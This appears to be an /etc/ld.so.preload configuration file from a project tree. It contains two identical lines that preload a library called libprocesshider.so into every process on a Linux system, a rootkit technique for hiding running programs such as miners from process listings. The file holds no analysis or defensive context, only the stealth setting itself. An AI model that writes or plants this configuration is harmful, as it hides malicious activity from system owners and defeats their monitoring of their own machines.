# src/etc/ld.so.preload
/usr/local/lib/libprocesshider.so
/usr/local/lib/libprocesshider.so
